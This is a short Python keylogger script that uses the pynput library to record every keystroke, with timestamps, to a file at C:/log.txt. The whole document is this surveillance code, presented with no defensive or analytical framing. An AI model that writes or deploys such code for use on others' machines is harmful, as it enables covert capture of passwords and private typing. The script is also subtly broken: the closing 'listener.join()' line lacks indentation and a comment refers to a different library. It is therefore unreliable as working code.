#pynput module pip install is required for this code to work
from pynput.keyboard import Key, Listener
import logging
log_dir = r"C:/log.txt"
logging.basicConfig(filename = ("" + log_dir), level=logging.DEBUG, format='%(asctime)s: %(message)s') 
def on_press(key):
   logging.info(str(key))
# create a hook manager object 
with Listener(on_press=on_press) as listener:
listener.join()